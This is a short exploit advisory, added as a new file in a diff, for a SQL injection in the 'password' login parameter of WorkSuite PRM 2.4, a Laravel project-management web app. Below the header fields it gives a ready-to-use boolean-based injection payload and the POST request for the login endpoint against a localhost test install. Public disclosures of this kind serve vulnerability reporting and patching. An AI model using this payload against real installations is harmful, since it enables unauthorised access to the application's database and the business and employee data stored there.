@@ -1,0 +1,19 @@
+﻿===========================================================================================
+# Exploit Title: WorkSuite PRM 2.4 - 'password' SQL Inj.
+# Dork: N/A
+# Date: 01-05-2019
+# Exploit Author: Mehmet EMİROĞLU
+# Vendor Homepage: https://codecanyon.net/item/worksuite-project-management-system/20052522
+# Software Link: https://codecanyon.net/item/worksuite-project-management-system/20052522
+# Version: v2.4
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: Worksuite is a project management software written in Laravel 5.4 (PHP Framework) which is specifically developed for freelancers and SMEs (Small/Medium sized enterprises). You can manage your company's daily work, your employee's tasks, keep a track on project's progress and much more. It is designed with latest security and code standards.
+===========================================================================================
+# POC - SQLi
+# Parameters : password
+# Attack Pattern : %27 RLIKE (case when  5021001=5021001 then 0x454d49524f474c55 else 0x28 end) and '7917'='7917
+# POST Method :
+http://localhost/worksuite24/public/login^_token=1knO8SR8Erjg56Mza4VaEv1Mb9lj5HiJBPmbTnFx&password=3115065[SQLINJECT HERE]
+===========================================================================================
